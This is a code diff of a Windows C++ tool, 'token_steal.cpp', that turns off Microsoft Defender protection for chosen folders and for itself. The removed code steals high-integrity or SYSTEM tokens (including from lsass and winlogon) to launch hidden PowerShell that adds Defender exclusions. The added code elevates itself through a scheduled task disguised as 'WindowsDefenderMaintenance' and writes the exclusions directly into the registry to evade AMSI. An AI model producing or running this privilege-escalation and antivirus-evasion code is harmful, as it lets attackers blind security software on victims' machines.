@@ -1,15 +1,15 @@
 /*
-    Token Impersonation -> Elevated Process -> Defender Exclusion
+    Elevation via Scheduled Task -> Direct HKLM Registry Write
 
-    Flow:
-      1. Enumerate all processes
-      2. Find one running at High integrity under current user
-      3. Duplicate its token
-      4. Spawn elevated cmd.exe with that token
-      5. Add Defender exclusion from elevated context
+    Two-phase execution:
+      Phase 1 (Medium integrity): Use schtasks.exe to schedule THIS binary
+                                   to rerun at High integrity (/rl highest)
+      Phase 2 (High integrity):   Binary detects /elevated flag,
+                                   writes directly to HKLM Defender exclusions
+                                   (no PowerShell, no AMSI)
 
     Compile:
-      cmd /c "vcvars64.bat && cl.exe token_steal.cpp /EHsc /link advapi32.lib /out:token_steal.exe"
+      cl.exe token_steal.cpp /EHsc /link advapi32.lib shell32.lib /out:token_steal.exe
 */
 
 #include <windows.h>
@@ -21,6 +21,7 @@
 #include <ctime>
 
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shell32.lib")
 
 // ─── Logging ─────────────────────────────────────────────────────────────────
 
@@ -54,11 +55,11 @@ void WinErr(const char* ctx) {
     char m[512]={};
     FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                    nullptr,e,0,m,sizeof(m),nullptr);
-    for(int i=strlen(m)-1;i>=0&&(m[i]=='\r'||m[i]=='\n');i--) m[i]=0;
+    for(int i=(int)strlen(m)-1;i>=0&&(m[i]=='\r'||m[i]=='\n');i--) m[i]=0;
     ERR("%s failed — %lu: %s", ctx, e, m);
 }
 
-// ─── Get integrity level of a token ──────────────────────────────────────────
+// ─── Integrity helpers ────────────────────────────────────────────────────────
 
 DWORD GetTokenIntegrity(HANDLE hToken) {
     DWORD dwLen = 0;
@@ -83,311 +84,195 @@ const char* IntegrityName(DWORD l) {
     return "System";
 }
 
-// ─── Get current user SID as string ──────────────────────────────────────────
-
-std::string GetCurrentUserSid() {
-    HANDLE hToken = nullptr;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return "";
-    DWORD dwLen = 0;
-    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLen);
-    PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(0, dwLen);
-    if (!pUser) { CloseHandle(hToken); return ""; }
-    GetTokenInformation(hToken, TokenUser, pUser, dwLen, &dwLen);
-    LPSTR sidStr = nullptr;
-    ConvertSidToStringSidA(pUser->User.Sid, &sidStr);
-    std::string result = sidStr ? sidStr : "";
-    if (sidStr) LocalFree(sidStr);
-    LocalFree(pUser);
-    CloseHandle(hToken);
-    return result;
+DWORD MyIntegrity() {
+    HANDLE h = nullptr;
+    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h);
+    DWORD lvl = GetTokenIntegrity(h);
+    if (h) CloseHandle(h);
+    return lvl;
 }
 
-// ─── Check if a process token belongs to current user ────────────────────────
+// ─── Phase 2: Write exclusions directly to HKLM (no PowerShell/AMSI) ─────────
 
-bool IsCurrentUser(HANDLE hToken) {
-    std::string mySid = GetCurrentUserSid();
-    if (mySid.empty()) return false;
+bool WriteExclusionsDirect() {
+    INFO("=== Phase 2: Writing exclusions directly to HKLM ===");
+    DWORD lvl = MyIntegrity();
+    INFO("Integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));
 
-    DWORD dwLen = 0;
-    GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLen);
-    if (!dwLen) return false;
-    PTOKEN_USER pUser = (PTOKEN_USER)LocalAlloc(0, dwLen);
-    if (!pUser) return false;
-    if (!GetTokenInformation(hToken, TokenUser, pUser, dwLen, &dwLen)) {
-        LocalFree(pUser); return false;
+    if (lvl < 0x3000) {
+        ERR("Not at High integrity — scheduled task elevation may have failed");
+        return false;
     }
-    LPSTR sidStr = nullptr;
-    ConvertSidToStringSidA(pUser->User.Sid, &sidStr);
-    bool match = sidStr && (mySid == sidStr);
-    if (sidStr) LocalFree(sidStr);
-    LocalFree(pUser);
-    return match;
+    OK("High integrity confirmed — writing to HKLM...");
+
+    const char* paths[] = {
+        "C:\\Users\\Public",
+        "C:\\exclusiontest",
+    };
+    const char* keyPath = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
+
+    HKEY hKey = nullptr;
+    LONG res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey);
+    if (res != ERROR_SUCCESS) {
+        // Try creating it
+        res = RegCreateKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, nullptr,
+                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+                              nullptr, &hKey, nullptr);
+    }
+    if (res != ERROR_SUCCESS) {
+        ERR("RegOpenKeyEx/Create HKLM Defender Paths: %ld", res);
+        return false;
+    }
+
+    bool allOk = true;
+    for (const char* p : paths) {
+        DWORD val = 0;
+        LONG r = RegSetValueExA(hKey, p, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
+        if (r == ERROR_SUCCESS)
+            OK("Exclusion added: %s", p);
+        else {
+            ERR("RegSetValueEx for %s: %ld", p, r);
+            allOk = false;
+        }
+    }
+    RegCloseKey(hKey);
+
+    // Also add process exclusion via Processes key
+    HKEY hProcKey = nullptr;
+    res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes",
+        0, KEY_SET_VALUE, &hProcKey);
+    if (res == ERROR_SUCCESS) {
+        DWORD val = 0;
+        RegSetValueExA(hProcKey, "token_steal.exe", 0, REG_DWORD,
+                       (const BYTE*)&val, sizeof(val));
+        RegCloseKey(hProcKey);
+        OK("Process exclusion added: token_steal.exe");
+    }
+
+    if (allOk) {
+        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "w");
+        if (f) { fprintf(f, "success-direct-registry\n"); fclose(f); }
+        OK("SUCCESS — exclusions written to HKLM Defender registry!");
+        OK("Verify: Get-MpPreference | Select ExclusionPath");
+    }
+    return allOk;
+}
+
+// ─── Phase 1: Use schtasks to relaunch at High integrity ─────────────────────
+
+bool ElevateViaSchtasks(const char* myExePath) {
+    INFO("=== Phase 1: Elevating via schtasks /rl highest ===");
+    INFO("This schedules THIS binary to run elevated, then runs it");
+    INFO("Phase 2 (when elevated) writes directly to HKLM — no PowerShell/AMSI");
+
+    // Task name — blend in
+    const char* taskName = "WindowsDefenderMaintenance";
+
+    // Build schtasks create command
+    // /rl highest = run at highest privilege level (High integrity, no UAC for admins)
+    // /sc once /st 00:00 = one-shot trigger (immediately overridden by /run)
+    // We pass /elevated flag so Phase 2 knows to write directly
+    char createCmd[2048];
+    snprintf(createCmd, sizeof(createCmd),
+        "schtasks /create "
+        "/tn \"%s\" "
+        "/tr \"\\\"%s\\\" /elevated\" "
+        "/sc once /st 00:00 "
+        "/rl highest "
+        "/f",
+        taskName, myExePath);
+
+    DBG("schtasks create: %s", createCmd);
+    INFO("Creating scheduled task...");
+    int r = system(createCmd);
+    if (r != 0) {
+        ERR("schtasks /create returned %d", r);
+        return false;
+    }
+    OK("Task created");
+
+    Sleep(500);
+
+    // Run the task
+    char runCmd[256];
+    snprintf(runCmd, sizeof(runCmd), "schtasks /run /tn \"%s\"", taskName);
+    DBG("schtasks run: %s", runCmd);
+    INFO("Running task (Phase 2 will execute at High integrity)...");
+    r = system(runCmd);
+    if (r != 0) {
+        WARN("schtasks /run returned %d (may still have worked)", r);
+    }
+    OK("Task run triggered — waiting 6s for completion...");
+
+    Sleep(6000);
+
+    // Cleanup
+    char delCmd[256];
+    snprintf(delCmd, sizeof(delCmd), "schtasks /delete /tn \"%s\" /f >nul 2>&1", taskName);
+    system(delCmd);
+    DBG("Task deleted");
+
+    // Check for result file written by Phase 2
+    FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
+    if (f) {
+        char buf[256]={};
+        fgets(buf, sizeof(buf), f);
+        fclose(f);
+        OK("Phase 2 result: %s", buf);
+        OK("SUCCESS — exclusions active!");
+        return true;
+    }
+
+    WARN("No result file from Phase 2");
+    WARN("Defender may have killed the elevated process");
+    WARN("Check task execution: Get-ScheduledTask -TaskName \"%s\"", taskName);
+    return false;
 }
 
 // ─── Main ─────────────────────────────────────────────────────────────────────
 
-int main() {
+int main(int argc, char* argv[]) {
+    // Phase 2: running elevated via scheduled task
+    if (argc > 1 && _stricmp(argv[1], "/elevated") == 0) {
+        InitLog("C:\\exclusiontest\\token_log_elevated.txt");
+        INFO("=== token_steal.exe (Phase 2 / Elevated) ===");
+        bool ok = WriteExclusionsDirect();
+        if (gLog) fclose(gLog);
+        return ok ? 0 : 1;
+    }
+
+    // Phase 1: normal launch at Medium integrity
     InitLog("C:\\exclusiontest\\token_log.txt");
-    INFO("=== Token Impersonation -> Elevation ===");
+    INFO("=== token_steal.exe (Phase 1) ===");
 
-    // Show our own integrity
-    HANDLE hSelf = nullptr;
-    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hSelf);
-    DWORD myLevel = GetTokenIntegrity(hSelf);
-    CloseHandle(hSelf);
-    INFO("Current process integrity: 0x%04lX (%s)", myLevel, IntegrityName(myLevel));
-    INFO("Current user SID: %s", GetCurrentUserSid().c_str());
+    DWORD lvl = MyIntegrity();
+    INFO("Current integrity: 0x%04lX (%s)", lvl, IntegrityName(lvl));
 
-    // Enable SeDebugPrivilege + SeImpersonatePrivilege
-    // SeImpersonatePrivilege is present-but-disabled in admin Medium tokens
-    // and is REQUIRED by CreateProcessWithTokenW
-    INFO("Enabling privileges...");
-    {
-        struct { const char* name; bool required; } privs[] = {
-            { "SeDebugPrivilege",       false },
-            { "SeImpersonatePrivilege", true  },
-        };
-        HANDLE hMyTok = nullptr;
-        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hMyTok);
-        for (auto& p : privs) {
-            LUID luid = {};
-            if (!LookupPrivilegeValueA(nullptr, p.name, &luid)) {
-                WARN("LookupPrivilegeValue(%s) failed", p.name); continue;
-            }
-            TOKEN_PRIVILEGES tp = {};
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Luid = luid;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            if (AdjustTokenPrivileges(hMyTok, FALSE, &tp, 0, nullptr, nullptr) &&
-                GetLastError() == ERROR_SUCCESS)
-                OK("%-30s enabled", p.name);
-            else {
-                DWORD e = GetLastError();
-                if (p.required)
-                    ERR("%-30s FAILED to enable (error %lu) — CreateProcessWithTokenW will likely fail", p.name, e);
-                else
-                    WARN("%-30s not available (error %lu)", p.name, e);
-            }
-        }
-        CloseHandle(hMyTok);
-    }
-
-    // Snapshot all processes
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) {
-        WinErr("CreateToolhelp32Snapshot"); return 1;
-    }
-
-    PROCESSENTRY32 pe = {};
-    pe.dwSize = sizeof(pe);
-
-    HANDLE hBestToken = nullptr;
-    DWORD  bestPid    = 0;
-    char   bestName[MAX_PATH] = {};
-    DWORD  bestLevel  = 0;
-
-    INFO("Scanning processes for High integrity token owned by current user...");
-    INFO("%-30s %6s  %s", "Name", "PID", "Integrity");
-    INFO("%-30s %6s  %s", "------------------------------", "------", "---------");
-
-    if (Process32First(hSnap, &pe)) {
-        do {
-            // PROCESS_QUERY_LIMITED_INFORMATION works cross-integrity
-            // PROCESS_QUERY_INFORMATION may be blocked by Medium->High boundary
-            HANDLE hProc = OpenProcess(
-                PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
-            if (!hProc) continue;
-
-            // First open with limited rights to check integrity/user
-            HANDLE hTokCheck = nullptr;
-            OpenProcessToken(hProc, TOKEN_QUERY, &hTokCheck);
-
-            HANDLE hTok = nullptr; // will hold duplicatable token if we want this process
-
-            if (hTokCheck) {
-                DWORD level = GetTokenIntegrity(hTokCheck);
-                bool isUser = IsCurrentUser(hTokCheck);
-                CloseHandle(hTokCheck);
-
-                if (level >= 0x3000) {
-                    INFO("  %-28s %6lu  %-8s  %s",
-                         pe.szExeFile, pe.th32ProcessID,
-                         IntegrityName(level),
-                         isUser ? "<-- owned by us" : "");
-                }
-
-                // Try to get a duplicatable token for this process
-                if (level >= 0x3000 && level < 0x4000 && isUser && !hBestToken) {
-                    // Need TOKEN_DUPLICATE — try opening the token with full rights
-                    if (OpenProcessToken(hProc,
-                            TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok)) {
-                        HANDLE hDup = nullptr;
-                        if (DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nullptr,
-                                SecurityImpersonation, TokenPrimary, &hDup)) {
-                            hBestToken = hDup;
-                            bestPid    = pe.th32ProcessID;
-                            bestLevel  = level;
-                            strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
-                            OK("Selected + duplicated: %s (PID %lu)", bestName, bestPid);
-                        } else {
-                            DBG("DuplicateTokenEx failed for %s (PID %lu) error %lu",
-                                pe.szExeFile, pe.th32ProcessID, GetLastError());
-                        }
-                        CloseHandle(hTok);
-                    } else {
-                        DBG("OpenProcessToken (full rights) failed for %s (PID %lu) error %lu",
-                            pe.szExeFile, pe.th32ProcessID, GetLastError());
-                    }
-                }
-            }
-            CloseHandle(hProc);
-        } while (Process32Next(hSnap, &pe));
-    }
-    CloseHandle(hSnap);
-
-    if (!hBestToken) {
-        // No High user-owned process found — try System-level (need SeDebugPrivilege)
-        WARN("No High integrity user process found — trying System processes...");
-        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        pe.dwSize = sizeof(pe);
-        if (Process32First(hSnap, &pe)) {
-            do {
-                if (_stricmp(pe.szExeFile, "winlogon.exe") != 0 &&
-                    _stricmp(pe.szExeFile, "lsass.exe")    != 0) continue;
-
-                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
-                if (!hProc) continue;
-                HANDLE hTok = nullptr;
-                if (OpenProcessToken(hProc,
-                    TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, &hTok)) {
-                    DWORD level = GetTokenIntegrity(hTok);
-                    if (level >= 0x4000 && !hBestToken) {
-                        hBestToken = hTok;
-                        bestPid = pe.th32ProcessID;
-                        bestLevel = level;
-                        strncpy_s(bestName, pe.szExeFile, MAX_PATH-1);
-                        OK("Selected System process: %s (PID %lu)", bestName, bestPid);
-                        hTok = nullptr; // don't close
-                    }
-                }
-                if (hTok) CloseHandle(hTok);
-                CloseHandle(hProc);
-            } while (Process32Next(hSnap, &pe));
-        }
-        CloseHandle(hSnap);
-    }
-
-    if (!hBestToken) {
-        ERR("Could not find any suitable token to duplicate.");
-        ERR("Try running from an elevated prompt or enable SeDebugPrivilege.");
+    // If already elevated (e.g. run from admin prompt), just write directly
+    if (lvl >= 0x3000) {
+        OK("Already at High integrity — skipping schtasks, writing directly");
+        WriteExclusionsDirect();
         goto done;
     }
 
-    // Duplicate as Primary token for CreateProcessWithTokenW
-    INFO("Duplicating token from %s (PID %lu) as Primary...", bestName, bestPid);
-    HANDLE hPriToken = nullptr;
-    if (!DuplicateTokenEx(hBestToken, TOKEN_ALL_ACCESS, nullptr,
-            SecurityImpersonation, TokenPrimary, &hPriToken)) {
-        WinErr("DuplicateTokenEx (primary)");
-        CloseHandle(hBestToken);
-        goto done;
-    }
-    CloseHandle(hBestToken);
-    OK("Primary token duplicated");
-
-    // Spawn elevated PowerShell with the duplicated High integrity token
-    // Requires SeImpersonatePrivilege (enabled above) — NOT SeAssignPrimaryTokenPrivilege
-    INFO("Spawning elevated PowerShell via CreateProcessWithTokenW...");
+    INFO("Medium integrity — will use schtasks to self-elevate");
     {
-        wchar_t wcmd[] =
-            L"powershell.exe -NoProfile -WindowStyle Hidden -Command \""
-            L"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force; "
-            L"Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force; "
-            L"Add-MpPreference -ExclusionProcess 'token_steal.exe' -Force; "
-            L"Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"";
+        char myPath[MAX_PATH] = {};
+        GetModuleFileNameA(nullptr, myPath, MAX_PATH);
+        INFO("Our path: %s", myPath);
 
-        STARTUPINFOW si = {};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {};
-
-        BOOL ok = CreateProcessWithTokenW(
-            hPriToken,
-            LOGON_WITH_PROFILE,
-            nullptr,
-            wcmd,
-            CREATE_NO_WINDOW,
-            nullptr, nullptr,
-            &si, &pi);
-
-        if (ok) {
-            OK("Elevated process spawned (PID %lu) — waiting...", pi.dwProcessId);
-            WaitForSingleObject(pi.hProcess, 10000);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        } else {
-            WinErr("CreateProcessWithTokenW");
-
-            // Fallback: impersonate on thread + run via WMI Win32_Process
-            INFO("Fallback: ImpersonateLoggedOnUser + WMI Win32_Process...");
-
-            // Re-duplicate as impersonation token for ImpersonateLoggedOnUser
-            HANDLE hImpTok = nullptr;
-            DuplicateTokenEx(hPriToken, TOKEN_ALL_ACCESS, nullptr,
-                SecurityImpersonation, TokenImpersonation, &hImpTok);
-
-            if (hImpTok && ImpersonateLoggedOnUser(hImpTok)) {
-                OK("Thread impersonation active");
-                // Use WMI to create process — WMI respects thread token
-                // Build a one-liner via cmd /c start /high
-                char cmd2[1024];
-                snprintf(cmd2, sizeof(cmd2),
-                    "powershell.exe -NoProfile -WindowStyle Hidden -Command \""
-                    "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force;"
-                    "Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force;"
-                    "Write-Output done | Out-File C:\\exclusiontest\\exclusion_result.txt\"");
-
-                STARTUPINFOA si2 = {}; si2.cb = sizeof(si2);
-                si2.dwFlags = STARTF_USESHOWWINDOW; si2.wShowWindow = SW_HIDE;
-                PROCESS_INFORMATION pi2 = {};
-                if (CreateProcessA(nullptr, cmd2, nullptr, nullptr,
-                        FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si2, &pi2)) {
-                    OK("Process spawned under impersonation (PID %lu)", pi2.dwProcessId);
-                    WaitForSingleObject(pi2.hProcess, 10000);
-                    CloseHandle(pi2.hProcess);
-                    CloseHandle(pi2.hThread);
-                } else {
-                    WinErr("CreateProcessA under impersonation");
-                }
-                RevertToSelf();
-                INFO("Reverted impersonation");
-            } else {
-                WinErr("ImpersonateLoggedOnUser fallback");
-            }
-            if (hImpTok) CloseHandle(hImpTok);
-        }
-        CloseHandle(hPriToken);
-    }
-
-    // Check result
-    Sleep(1000);
-    {
-        FILE* f = fopen("C:\\exclusiontest\\exclusion_result.txt", "r");
-        if (f) {
-            char buf[256]={};
-            fgets(buf, sizeof(buf), f);
-            fclose(f);
-            OK("Result: %s", buf);
-            OK("SUCCESS — verify: Get-MpPreference | Select ExclusionPath");
-        } else {
-            WARN("No result file — exclusion may have failed");
-            WARN("Check manually: Get-MpPreference | Select ExclusionPath");
+        if (!ElevateViaSchtasks(myPath)) {
+            ERR("schtasks elevation failed");
+            INFO("Manual option: right-click token_steal.exe -> Run as administrator");
+            INFO("Or open elevated PowerShell and run:");
+            INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
+            INFO("  Add-MpPreference -ExclusionPath 'C:\\exclusiontest' -Force");
         }
     }
 
 done:
-    INFO("Log saved to C:\\exclusiontest\\token_log.txt");
+    INFO("Log: C:\\exclusiontest\\token_log.txt");
     if (gLog) fclose(gLog);
     printf("\nPress Enter to exit...\n");
     getchar();
